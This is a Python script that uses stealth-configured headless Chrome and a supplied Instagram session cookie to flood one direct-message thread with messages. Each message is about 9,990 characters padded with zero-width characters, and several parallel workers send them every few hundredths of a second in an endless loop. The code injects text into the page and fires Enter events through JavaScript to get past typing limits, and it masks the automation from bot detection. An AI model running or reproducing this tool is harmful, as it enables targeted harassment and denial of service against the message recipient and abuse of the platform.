# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (HYPER-VELOCITY V42)
# 📅 STATUS: HIGH-SPEED-STRIKE | 4-AGENT TOTAL | AWS-LOCK

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- VELOCITY CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.01, 0.05)  # 🔥 HYPER-DRIVE
REST_AFTER_STRIKES = 150   
REST_DURATION = 2          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_velocity_payload():
    """Generates a high-density payload optimized for fast socket transmission."""
    u_id = random.randint(100, 999)
    # \u2060 (WJ) + \u200D (ZWJ)
    glue, zwj = "\u2060", "\u200D"
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [SPD:{u_id}]"
    
    # We slightly reduce line count to 300 to ensure the local CPU can fire faster
    # But we increase internal density to keep the weight on the opponent.
    body = []
    for i in range(300):
        line = f"𝕻{zwj}𝙰{zwj}𝕻{zwj}𝙰{zwj}🌙{i}{glue*5}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9990]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        # Optimization: Disable everything that slows down the local bot
        chrome_options.add_argument("--disable-extensions")
        chrome_options.add_argument("--disable-notifications")
        chrome_options.add_argument("--disable-remote-fonts")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def hyper_send(driver, text):
    """Zero-latency DOM injection for maximum firing rate."""
    try:
        # This script 'Nukes' the input box and fires the ENTER event immediately
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                // Set the value directly to avoid 'typing' lag
                document.execCommand('insertText', false, arguments[0]);
                // Fire the keyboard event at the DOM level
                var e = new KeyboardEvent('keydown', {key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true});
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        driver = get_driver(agent_id)
        try:
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(12) 
            
            strike_count = 0
            while True:
                payload = get_velocity_payload()
                if hyper_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Speed-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 100 == 0:
                        # Quick refresh to keep the GitHub Runner RAM clean
                        driver.refresh()
                        time.sleep(5)
                
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(2)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
